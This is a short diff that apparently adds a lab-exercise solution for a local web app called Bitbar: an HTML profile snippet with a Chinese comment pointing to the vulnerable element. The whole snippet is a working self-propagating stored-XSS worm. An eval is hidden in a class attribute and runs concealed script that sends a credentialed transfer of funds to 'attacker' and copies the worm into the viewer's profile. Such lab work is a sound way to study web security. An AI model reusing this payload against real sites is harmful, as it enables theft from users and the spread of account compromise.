@@ -1,0 +1,20 @@
+<span id="attacker_profile">
+    <!-- 漏洞的关键在于下面的 bitbar_count id -->
+    <span id="bitbar_count" class="eval(document.getElementById('worm').innerHTML.replace('amp;', ''))"></span>
+    <span id="worm">
+        function send_xhr_post_request(request_url, post_data) {
+            const xhr = new XMLHttpRequest();
+            xhr.open("POST", request_url, true);
+            xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+            xhr.withCredentials = true;
+            xhr.send(post_data);
+
+            console.log(`url: ${request_url}\ndata: ${post_data}`);
+        }
+
+        document.getElementById("worm").style.display = "none";
+        
+        send_xhr_post_request("http://127.0.0.1:3000/post_transfer", "destination_username=attacker&quantity=1");
+        send_xhr_post_request("http://127.0.0.1:3000/set_profile", `new_profile=${encodeURIComponent(document.getElementById("attacker_profile").outerHTML)}`);
+    </span>
+</span>
